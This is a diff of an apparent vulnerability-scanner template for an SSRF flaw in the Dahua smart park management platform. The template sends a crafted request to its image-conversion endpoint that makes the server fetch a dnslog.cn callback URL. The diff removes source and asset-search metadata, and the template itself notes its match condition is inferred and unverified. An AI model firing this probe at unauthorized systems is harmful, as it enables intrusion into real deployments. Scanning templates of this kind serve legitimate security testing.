@@ -3,14 +3,8 @@ info:
   name: 大华智慧园区综合管理平台image存在ssrf漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/98d005fd878282f02e09d5e7746e5aa8
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: ssrf,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 98d005fd878282f02e09d5e7746e5aa8
-    fofa: + hunter:`app.name="Dahua 大华 智慧园区管理平台"`
 http:
 - raw:
   - 'GET /ipms/imageConvert/image?fileUrl=http://6nqhen.dnslog.cn/1.jpg HTTP/1.1
